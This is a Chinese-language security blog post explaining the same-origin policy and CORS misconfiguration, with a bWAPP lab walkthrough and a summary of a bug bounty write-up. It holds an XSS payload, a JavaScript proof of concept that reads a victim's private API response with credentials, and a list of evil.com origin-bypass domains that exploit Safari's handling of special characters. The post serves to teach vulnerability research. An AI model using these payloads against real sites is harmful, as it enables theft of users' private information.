#关于我们的技术分享群组
![PIC](http://c1h2e1.oss-cn-qingdao.aliyuncs.com/qrcode.jpg)
从原来的机制进行了修改，现在是收费的价格为50元

#About CORS
首先什么是同源
```
Two websites are said to have same origin if both have following in common:

Scheme (http, https)
Host name (google.com, facebook.com, securelayer7.net)
Port number (80, 4567, 7777)

So, sites http://example.com and http://example.com/settings have same origin.
But https://example.com:4657 and http://example.com:8080/settings have different origins

```
那么我们为什么需要同源呢，如果没有同源我们直接发送请求读取返回数据就可以了啊，但是这样是不安全的，所以同源策略(SOP)被创造出来了
```
同源策略(same-origin policy)限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的重要安全机制。
```
那么我们有些情景下需要进行跨源读取，所以CORS出现了
```
CORS是一个W3C标准，全称是"跨域资源共享"（Cross-origin resource sharing）。它允许浏览器向跨源(协议 + 域名 + 端口)服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制
```

###CORS Vulnerability??????
由于配置不当，Origin源未严格，从而造成跨域问题。

#Exploation
1. The attacker hosts a website containing the malicious script for cross domain interaction.

2. Victim i.e. the Admin of the intranet website visits the attacker’s website. Location http://127.0.0.1:4567
![PIC](/assets/images/cors1.png)
3. Response is received from the attacker’s website containing the following malicious payload:
![PIC](/assets/images/cors2.png)
4. As soon as the web page is loaded, ‘makeRequest’ method is called. The method initiates a cross domain request to capture the secret, to the vulnerable intranet application located at ‘http://127.0.0.1:80/bwapp/secret-cors-1.php’
![PIC](/assets/images/cors3.png)

#Out of Scope
write up地址
`https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397`
在这个案例我们可以学习到两种方法
1.通过子域名的XSS结合CORS利用
2.利用特殊符号和浏览器的结合去绕过子域名的检查


##hacking start
```This API endpoint was returning the user’s private information, like full name, email address, ….
To abuse this misconfiguration so we can perform an attack, like leaking users’ private information, we need either to claim an abandoned subdomain (Subdomain Takeover), or find an XSS in one of the existing subdomains.
```
这里也就是像我们说明这个漏洞的利用条件，我们利用这个漏洞需要一个XSS或者子域名接管，他选择了XSS。在子域名中发现了一个XSS
`https://banques.redacted.com/choice-quiz?form_banque="><script>alert(document.domain)</script>&form_cartes=73&iframestat=1`


POC
```HTML
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.status == 200) {
    alert(this.responseText);
    document.getElementById("demo").innerHTML = this.responseText;
    }
};
xhttp.open("GET", "https://www.redacted.com/api/return", true);
xhttp.withCredentials = true;
xhttp.send();
}
cors();
```
成功组合漏洞

##advenced
还是同样的情况，利用需要一个子域名接管或者XSS，但这里它使用了FUZZ去尝试通过特殊字符
![PIC](/assets/images/cors4.png)
这张表里面有各种浏览器支持的特殊字符，也就是说我们可以通过访问`*.target.com.特殊字符.youdomain.com`来绕过正则
这里FUZZ的位置是中间的特殊字符，字典是如下的符号
```
,
&
'
"
;
!
$
^
*
(
)
+
=
`
~
-
_
=
|
{
}
%
```
最终如下域名可以绕过
```
*.ubnt.com!.evil.com
*.ubnt.com".evil.com
*.ubnt.com$.evil.com
*.ubnt.com%0b.evil.com
*.ubnt.com%60.evil.com
*.ubnt.com&.evil.com
*.ubnt.com'.evil.com
*.ubnt.com(.evil.com
*.ubnt.com).evil.com
*.ubnt.com*.evil.com
*.ubnt.com,.evil.com
*.ubnt.com;.evil.com
*.ubnt.com=.evil.com
*.ubnt.com^.evil.com
*.ubnt.com`.evil.com
*.ubnt.com{.evil.com
*.ubnt.com|.evil.com
*.ubnt.com}.evil.com
*.ubnt.com~.evil.com
```
然后用safari访问一下看支不支持，之后注册这个子域名，然后就可以利用了
`https://zzzz.ubnt.com=.evil.com/cors-poc`
这里主要是利用了Safari浏览器支持特殊字符然后进行利用

#每日的文章推送和周日的技术分享的在Pentest explorer
